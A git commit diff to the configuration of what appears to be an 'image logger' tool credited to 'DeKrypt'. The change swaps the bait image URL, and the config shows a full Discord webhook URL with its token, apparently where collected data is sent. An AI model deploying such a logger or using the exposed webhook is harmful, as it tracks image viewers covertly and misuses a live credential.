f27f3f633ea377f16a4844f919b72d0c1254d3dd
GiggityBeater <117217850+GiggityBeater@users.noreply.github.com>
2024-03-11 06:52:07 +0000

    Moved files to new directories

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1209045445318545418/_JzWlJTYKDaET04SLe3PxEDX9O5LS6lzBoAQoBuz8au7MpI-tkE0lhGSE8YAOAnScIIh",
-    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fc.tenor.com%2Fk6fbWLshktQAAAAC%2Fdiscord-loading.gif&f=1&nofb=1&ipt=feb9735eedf2959c15e2e2bbfa403965d51ed6d23390174d2572fe5dc3a4d845&ipo=images", # You can also have a custom image by using a URL argument
+    "image": "https://staticc.sportskeeda.com/editor/2023/06/1a853-16863167597678-1920.jpg?w=720", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
